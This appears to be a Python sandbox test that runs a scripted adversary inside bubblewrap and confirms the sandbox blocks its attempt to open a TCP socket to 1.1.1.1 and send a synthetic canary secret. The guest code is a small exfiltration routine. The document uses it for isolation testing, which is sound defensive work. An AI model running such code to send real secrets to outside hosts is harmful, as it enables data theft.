#!/usr/bin/env python3
"""Run an executable adversarial actor inside bwrap, recording its real socket attempt."""
import json
import subprocess
from network_probe import BWRAP

GUEST='''import json,socket
public='quarterly revenue rose'
secret='GAUNTLET_SYNTHETIC_CANARY_7f0e'
try:
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(2)
 s.connect(('1.1.1.1',53));s.sendall(secret.encode())
 result={'attempted_exfiltration':True,'network_connected':True,'bytes_sent':len(secret)}
except OSError as exc:
 result={'attempted_exfiltration':True,'network_connected':False,'bytes_sent':0,'errno':exc.errno}
print(json.dumps({'answer':public,'network':result}))
'''

def run():
    p=subprocess.run(BWRAP+['/usr/bin/python3','-c',GUEST],capture_output=True,text=True,timeout=10)
    if p.returncode:raise RuntimeError('guest failed closed: '+p.stderr[:300])
    result=json.loads(p.stdout)
    n=result['network']
    if result['answer']!='quarterly revenue rose' or not n['attempted_exfiltration'] or n['network_connected'] or n['bytes_sent'] or n.get('errno')!=101:
        raise RuntimeError('isolation failure: '+repr(result))
    return {'assurance':'LOCAL','actor':'executable deterministic adversary, NOT Agy','observed':result,'verdict':'PASS','claim':'outbound IPv4 TCP connection prevented by guest network namespace'}

if __name__=='__main__':print(json.dumps(run(),indent=2))